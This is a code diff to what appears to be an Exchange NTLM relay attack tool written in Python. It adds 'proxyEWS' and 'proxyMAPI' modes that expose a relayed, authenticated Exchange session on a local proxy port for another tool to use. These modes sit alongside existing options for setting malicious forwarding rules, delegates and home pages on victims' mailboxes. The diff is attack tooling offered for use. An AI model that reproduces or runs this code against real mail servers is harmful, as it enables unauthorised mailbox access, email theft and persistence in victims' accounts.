@@ -24,17 +24,23 @@ from lib.targetsutils import TargetsProcessor, TargetsFileWatcher
 from lib import helper
 from lib import logger
 
+from ServerThread import ServerThread, ThreadManager
+
 #=========================================================================================
 # GLOBAL CONFIG
 #=========================================================================================
 templatesFolder = "SOAPRequestTemplates/"
 exchangeVersion = "Exchange2010_SP2"
 exchangeNamespace = {'m': 'http://schemas.microsoft.com/exchange/services/2006/messages', 't': 'http://schemas.microsoft.com/exchange/services/2006/types'}
+
+threadManager = ThreadManager(7000)
 	
 #=========================================================================================
 # Class EWSAttack
 #=========================================================================================
 class EWSAttack(Thread):
+	global threadManager
+
 	def __init__(self, config, HTTPClient, username):
 		Thread.__init__(self)
 		self.daemon = True
@@ -140,6 +146,7 @@ class EWSAttack(Thread):
 
 			except Exception, e:
 				print helper.color("[!] Error processing result for setHomePage: [{}]".format(str(e)))
+				print sys.exc_info()[0]
 
 		#------------------------------ FORWARD RULE ------------------------------
 		elif self.config.ewsRequest == "forwardRule":
@@ -175,6 +182,13 @@ class EWSAttack(Thread):
 			except Exception, e:
 				print helper.color("[!] Error processing result for addDelegate: [{}]".format(str(e)))
 			
+		elif self.config.ewsRequest == "proxyEWS":
+			print helper.color("[+] opening proxy port for EWS connection, have fun!")
+			threadManager.addThread(self.client)
+		elif self.config.ewsRequest == "proxyMAPI":
+			print helper.color("[+] opening proxy port for MAPI connection, have fun!")
+			threadManager.addThread(self.client, eptype="MAPI")
+		
 		#------------------------------ DEFAULT ------------------------------
 		else:
 			print helper.color(self.client.lastresult, 'blue')
@@ -208,13 +222,14 @@ if __name__ == '__main__':
 	parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
 
 	# EWS API arguments
-	parser.add_argument("-r","--request", action="store", required=True,  choices=['sendMail', 'setHomePage', 'getFolder', 'forwardRule', 'addDelegate'], help='The EWS service to call')
+	parser.add_argument("-r","--request", action="store", required=True,  choices=['sendMail', 'setHomePage', 'getFolder', 'forwardRule', 'addDelegate', 'proxyEWS', 'proxyMAPI'], help='The EWS service to call')
 	parser.add_argument("-d","--destAddresses", action="store", help='List of e-mail addresses to be used as destination for any EWS service that needs it.'
 						' Must be separated by a comma.')
 	parser.add_argument("-m","--message", action="store", help='Message File containing the body of the message as an HTML file')
 	parser.add_argument("-s","--subject", action="store", help='Message subject')
 	parser.add_argument("-f","--folder", action="store", choices=['inbox', 'sentitem', 'deleteditems', 'tasks','calendar','contacts'], help='The Exchange folder name to list')
 	parser.add_argument("-u","--url", action="store", help='URL to be used for the setHomePage request')
+
 
 	try:
 	   args = parser.parse_args()
@@ -303,6 +318,13 @@ if __name__ == '__main__':
 
 	print helper.color("[*] Running in relay mode to single host")
 	targetSystem = TargetsProcessor(singletarget=args.target)
+
+	if args.request == "proxyEWS" or args.request == "proxyMAPI":
+		# we're going to spawn threads for the connection and let another tool take over
+		
+		body = None
+		
+
 
 	#-----------------------------------------------------------------
 	# Setting up relay servers
